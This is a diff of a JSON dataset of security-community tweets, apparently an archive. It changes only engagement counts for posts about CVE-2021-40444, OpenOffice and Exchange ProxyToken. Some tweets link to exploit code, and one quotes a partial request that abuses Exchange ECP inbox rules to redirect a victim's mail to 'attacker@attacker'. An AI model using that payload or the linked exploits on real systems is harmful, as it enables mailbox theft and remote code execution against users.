@@ -107,7 +107,7 @@
     "expanded_url": [
         "https://github.com/klezVirus/CVE-2021-40444"
     ],
-    "tweetfavorites": 87,
+    "tweetfavorites": 86,
     "tweetquotes": 3,
     "tweetreplies": 0,
     "tweetretweets": 39,
@@ -420,10 +420,10 @@
     "expanded_url": [
         "https://medium.com/csg-govtech/all-your-d-base-are-belong-to-us-part-1-code-execution-in-apache-openoffice-cve-2021-33035-767fc7d6daf7?source=friends_link&sk=0cf113d71481c25f1a233e0c4f507357"
     ],
-    "tweetfavorites": 380,
+    "tweetfavorites": 352,
     "tweetquotes": 4,
     "tweetreplies": 10,
-    "tweetretweets": 125,
+    "tweetretweets": 111,
     "tweettext": "CVE-2021-33035: RCE in Apache OpenOffice up to 4.1.10 - pure memory corruption. Just talked about it at #hacktivitycon and full writeup at https://t.co/qYutUfml6J. More to come on CVE-2021-38646 Microsoft Office RCE... https://t.co/S3xmiHYYw8",
     "tweettime": "2021-09-18, 17:37:51",
     "tweeturl": "https://twitter.com/spaceraccoonsec/status/1439282533137408002",
@@ -551,10 +551,10 @@
         "https://github.com/lockedbyte/CVE-2021-40444",
         "https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/"
     ],
-    "tweetfavorites": 155,
+    "tweetfavorites": 145,
     "tweetquotes": 0,
     "tweetreplies": 1,
-    "tweetretweets": 68,
+    "tweetretweets": 51,
     "tweettext": "Malicious .docx Generator (Microsoft Office Word RCE) | CVE-2021-40444\n-\nRepo: https://t.co/bKyi7omP5p\n-\nCreator: @lockedbyte \n-\nBlog: https://t.co/hasffNJ02A\n-\n#cybersecurity  #infosec  #bugbounty  #bugbountytips #CTF #CVE https://t.co/oYaxcWiqmL",
     "tweettime": "2021-09-16, 14:38:19",
     "tweeturl": "https://twitter.com/0dayCTF/status/1438512577244373003",
@@ -859,10 +859,10 @@
     "username": "maddiestone"
 }
 {
-    "tweetfavorites": 59,
+    "tweetfavorites": 56,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 18,
+    "tweetretweets": 17,
     "tweettext": "Probando el CVE-2021-40444 (Microsoft Office Word Remote Code Execution)....Omito la parte de como paso el doc de un equipo a otro....El git de la POC os lo dejo en un segundo tweet https://t.co/z1dYfce565",
     "tweettime": "2021-09-13, 15:59:42",
     "tweeturl": "https://twitter.com/CacharroHacks/status/1437445896707379211",
@@ -892,10 +892,10 @@
     "username": "TheHackersNews"
 }
 {
-    "tweetfavorites": 511,
-    "tweetquotes": 7,
+    "tweetfavorites": 491,
+    "tweetquotes": 5,
     "tweetreplies": 5,
-    "tweetretweets": 166,
+    "tweetretweets": 158,
     "tweettext": "I'm too late at CVE-2021-40444 party. But i just wanted to take a look at MSIE exploitation. Awesome to see a full exploit (RCE w/ sandbox escape) only using 6 lines of javascript code. Cool no doubt. https://t.co/PzfXL46ARW",
     "tweettime": "2021-09-13, 12:21:01",
     "tweeturl": "https://twitter.com/j00sean/status/1437390861499838466",
@@ -1183,10 +1183,10 @@
     "username": "wvuuuuuuuuuuuuu"
 }
 {
-    "tweetfavorites": 877,
+    "tweetfavorites": 843,
     "tweetquotes": 14,
-    "tweetreplies": 19,
-    "tweetretweets": 311,
+    "tweetreplies": 18,
+    "tweetretweets": 298,
     "tweettext": "Popping calc with CVE-2021-40444 (MS Office exploit)\n\nThanks to @BouncyHat for collaborating 😀\n\nNot planning to release but my bet is with itw exploits, it won't be long.. https://t.co/1eVsUksMwj",
     "tweettime": "2021-09-08, 13:32:49",
     "tweeturl": "https://twitter.com/buffaloverflow/status/1435596990650503168",
@@ -1457,10 +1457,10 @@
     "expanded_url": [
         "https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server"
     ],
-    "tweetfavorites": 255,
+    "tweetfavorites": 249,
     "tweetquotes": 5,
     "tweetreplies": 5,
-    "tweetretweets": 122,
+    "tweetretweets": 120,
     "tweettext": "MS Exchange Server Email Snooping (CVE-2021-33766) \n\nPoC to handle victim's email box\n\nPOST /ecp/victim@victim/RulesEditor/InboxRules.svc/NewObject?msExchEcpCanary=b0o0\n...\nCookie: SecurityToken=x\n...\n\n{\"properties\":{\"Redirecto\":...\"attacker@attacker\"\n\nhttps://t.co/A7ja28klay https://t.co/GOUB5DB9N8",
     "tweettime": "2021-09-01, 05:12:14",
     "tweeturl": "https://twitter.com/wugeej/status/1432934299506855942",
